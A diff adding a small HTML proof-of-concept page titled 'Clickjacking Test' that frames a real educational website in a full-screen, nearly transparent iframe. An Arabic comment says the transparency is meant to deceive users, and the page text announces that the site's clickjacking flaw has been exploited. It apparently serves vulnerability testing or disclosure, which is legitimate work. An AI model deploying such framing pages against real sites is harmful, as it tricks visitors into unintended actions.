@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Test</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.1; /* شفافية منخفضة لخداع المستخدم */
+        }
+    </style>
+</head>
+<body>
+    <h1>Clickjacking Attack Demo</h1>
+    <p>تم استغلال ثغرة Clickjacking على هذا الموقع!</p>
+
+    <iframe src="https://vocational.edu.iq" frameborder="0"></iframe>
+</body>
+</html>
